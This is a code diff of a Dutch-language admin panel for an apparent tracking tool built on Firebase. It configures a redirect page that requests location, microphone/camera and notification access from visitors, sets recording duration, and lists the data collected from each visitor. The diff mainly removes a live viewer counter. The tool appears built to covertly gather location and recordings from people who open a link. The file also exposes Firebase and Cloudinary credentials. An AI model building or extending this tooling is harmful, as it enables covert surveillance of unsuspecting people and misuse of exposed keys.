@@ -1,4 +1,4 @@
-<!-- location.html -->
+<!-- location.html (without Live Viewer Count) -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instellingen</title>
     <style>
-        /* (All your existing styles, *NO CHANGES NEEDED HERE*) */
+        /* (All your existing styles, *EXCEPT* the #viewer-count-container style) */
          body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
@@ -388,19 +388,6 @@
             margin-top: 5px;
             display: none;
         }
-
-        /* NEW: Style for the viewer count */
-        #viewer-count-container {
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #f0f8ff; /* Light blue background */
-            border: 1px solid #add8e6; /* Light blue border */
-            border-radius: 4px;
-            text-align: center;
-            font-size: 1.1rem;
-            font-weight: bold;
-            color: #007bff; /* Blue text */
-        }
     </style>
 
      <!-- Firebase SDK (Firestore) -->
@@ -408,8 +395,9 @@
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
     <!-- Firebase SDK (Storage) -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
-
+    <!-- Firebase SDK (Functions) -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-functions-compat.js"></script>
+
     <!-- Cloudinary Widget -->
     <script src="https://widget.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script>
 
@@ -450,8 +438,6 @@
         <p id="notification-permission-message">Accepteer notificatie toestemming om notificaties te ontvangen.</p>
 
         <!-- Global Input Fields -->
-        <!-- REMOVED: Standaardbericht input -->
-
         <div class="input-row">
             <label for="redirect-url">Doorverwijs-URL *</label>
             <input type="url" id="redirect-url" class="input-field" placeholder="https://example.com" required>
@@ -480,7 +466,6 @@
             <label for="edit-theme-selector">Bewerk Thema:</label>
             <select id="edit-theme-selector" class="input-field">
                 <option value="">-- Kies een thema om te bewerken --</option>
-                <!-- Aangepaste thema's worden hier toegevoegd -->
             </select>
         </div>
 
@@ -498,10 +483,7 @@
           <!-- Data Section -->
         <div class="data-section">
             <h3 id="data-table-title" class="editable-title" data-original-title="Verzamelde Gegevens:">Verzamelde Gegevens:</h3>
-             <!-- NEW: Viewer Count Display -->
-            <div id="viewer-count-container">
-                Aantal gebruikers op doorverwijs pagina: <span id="viewer-count">0</span>
-            </div>
+            <!-- REMOVED: Viewer Count Display -->
             <table class="data-table">
                 <tbody id="data-list">
                     <!-- User data rows will be added here -->
@@ -511,7 +493,8 @@
 
         <!-- Theme Modal -->
         <div id="themeModal" class="modal">
-            <div class="modal-content">
+            <!-- ... (Your Theme Modal HTML) ... -->
+             <div class="modal-content">
                 <span class="close-button" id="close-modal-button">×</span>
                 <h2>Maak/Bewerk Redirect Thema</h2>
                 <div class="modal-input-row">
@@ -545,7 +528,7 @@
     </div>
 
     <script>
-// --- Firebase Config (YOUR ACTUAL CONFIG) ---
+// --- Firebase Config ---
 const firebaseConfig = {
     apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA",  // REPLACE
     authDomain: "loctrac-8d7ef.firebaseapp.com",        // REPLACE
@@ -556,11 +539,10 @@ const firebaseConfig = {
     measurementId: "G-65PYC8E9VR"                       // REPLACE
 };
 
-// Cloudinary Configuration - REPLACE WITH YOURS!
+// Cloudinary Configuration
 const cloudName = "dnvkhmgj0";     // REPLACE
 const uploadPreset = "locstorage"; // REPLACE
 
-// Initialize Firebase
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 const functions = firebase.functions(); // Initialize Firebase Functions
@@ -586,7 +568,6 @@ const micCamPermissionToggle = document.getElementById('mic-cam-permission');
 const locationPermissionToggle = document.getElementById('location-permission');
 const notificationPermissionToggle = document.getElementById('notification-permission');
 const dataList = document.getElementById('data-list');
-// REMOVED: const messageText = document.getElementById('message-text');
 const redirectUrl = document.getElementById('redirect-url');
 const redirectSeconds = document.getElementById('redirect-seconds');
 const recordSeconds = document.getElementById('record-seconds');
@@ -600,27 +581,15 @@ const backgroundImageURLInput = document.getElementById('background-image-url');
 const iconImageURLInput = document.getElementById('icon-image-url');
 const customTextInput = document.getElementById('custom-text-modal');
 const notificationPermissionMessage = document.getElementById('notification-permission-message');
-const viewerCountSpan = document.getElementById('viewer-count'); // Viewer count element
+// REMOVED: const viewerCountSpan = document.getElementById('viewer-count');
 
-let currentUserId = "user1"; // Initial user ID
+let currentUserId = "user1";
 
-// --- Theme Definitions ---
 const themes = {
-    default: {
-        bodyBackgroundColor: '#f3f7fa',
-        buttonBackgroundColor: '#007bff',
-    },
-    dark: {
-        bodyBackgroundColor: '#121212',
-        buttonBackgroundColor: '#00a86b',
-    },
-    green: {
-        bodyBackgroundColor: '#e8f5e9',
-        buttonBackgroundColor: '#4caf50',
-    },
+    default: { bodyBackgroundColor: '#f3f7fa', buttonBackgroundColor: '#007bff' },
+    dark: { bodyBackgroundColor: '#121212', buttonBackgroundColor: '#00a86b' },
+    green: { bodyBackgroundColor: '#e8f5e9', buttonBackgroundColor: '#4caf50' },
 };
-
-// --- Helper Functions ---
 
 function getCurrentPositionPromise() {
     return new Promise((resolve, reject) => {
@@ -634,7 +603,6 @@ function getBatteryPromise() {
     });
 }
 
-// Get next user ID (transaction-safe)
 async function getNextUserId() {
     const counterRef = db.collection('counters').doc('userCounter');
     try {
@@ -676,7 +644,6 @@ async function saveCustomTheme(saveNow = true) {
         backgroundImageUrl: backgroundImageUrl,
         iconImageUrl: iconImageUrl,
         redirectHeading: customText,  // Use customText for the redirect heading
-        // Don't include customText if it's being used for redirectHeading
     };
 
 
@@ -783,7 +750,6 @@ function updateExplanations(){
     }
 }
 
-// Load Settings and Data
 async function loadSettingsAndData(userId) {
     try {
         const settingsRef = db.collection('userSettings').doc(userId);
@@ -794,7 +760,6 @@ async function loadSettingsAndData(userId) {
             micCamPermissionToggle.checked = settingsData.micCamPermission || false;
             locationPermissionToggle.checked = settingsData.locationPermission || false;
             notificationPermissionToggle.checked = settingsData.notificationPermission || false;
-            // REMOVED: messageText.value = settingsData.messageText || '';
             redirectUrl.value = settingsData.redirectUrl || '';
             redirectSeconds.value = settingsData.redirectSeconds || '0';
             recordSeconds.value = settingsData.recordSeconds || '0';
@@ -805,7 +770,6 @@ async function loadSettingsAndData(userId) {
             micCamPermissionToggle.checked = false;
             locationPermissionToggle.checked = false;
             notificationPermissionToggle.checked = false;
-            // REMOVED: messageText.value = '';
             redirectUrl.value = '';
             redirectSeconds.value = '0';
             recordSeconds.value = '0';
@@ -832,7 +796,6 @@ async function saveSettings() {
             micCamPermission: micCamPermissionToggle.checked,
             locationPermission: locationPermissionToggle.checked,
             notificationPermission: notificationPermissionToggle.checked,
-            // REMOVED: messageText: messageText.value,
             redirectUrl: redirectUrl.value,
             redirectSeconds: redirectSeconds.value,
             recordSeconds: recordSeconds.value,
@@ -850,10 +813,8 @@ async function saveSettings() {
         displayError(`Fout bij opslaan instellingen: ${error.message}`);
     }
 }
-
-// Display User Data (Vertical Layout)
 async function displayData(userId, userData) {
-    const row = document.createElement('tr');
+     const row = document.createElement('tr');
     row.id = `user-row-${userId}`;
 
     let cellContent = `
@@ -906,7 +867,6 @@ async function displayData(userId, userData) {
     }
 }
 
-// Load All User Data
 async function loadAllUserData() {
     dataList.innerHTML = '';
     try {
@@ -947,7 +907,6 @@ async function sendNotificationForUser(targetUserId) {
     }
 }
 
-// Delete All User Data
 async function deleteAllData() {
     if (!confirm("Weet je zeker dat je ALLE gebruikersdata wilt verwijderen? Dit kan NIET ongedaan gemaakt worden!")) {
         return;
@@ -1184,28 +1143,13 @@ saveCustomThemeButton.addEventListener('click', handleSaveCustomThemeButtonClick
 uploadBackgroundButton.addEventListener('click', handleUploadBackgroundButtonClick);
 uploadIconButton.addEventListener('click', handleUploadIconButtonClick);
 
-function setupViewerCountListener() {
-    const viewerCountRef = db.collection('metrics').doc('redirectViewers');
+// REMOVED: setupViewerCountListener();
 
-    viewerCountRef.onSnapshot((doc) => {
-        if (doc.exists) {
-            const count = doc.data().count || 0;
-            viewerCountSpan.textContent = count;
-        } else {
-            viewerCountSpan.textContent = '0';
-            console.log("No viewer count document found.");
-        }
-    }, (error) => {
-        console.error("Error getting viewer count:", error);
-        viewerCountSpan.textContent = 'Error';
-    });
-}
 loadSettingsAndData(currentUserId).catch(error => {
     console.error("Unhandled error in initial load:", error);
     displayError("Fout bij initialiseren van de pagina.");
 });
 updateNotificationPermissionStatus();
-setupViewerCountListener();
 
 </script>
 </body>
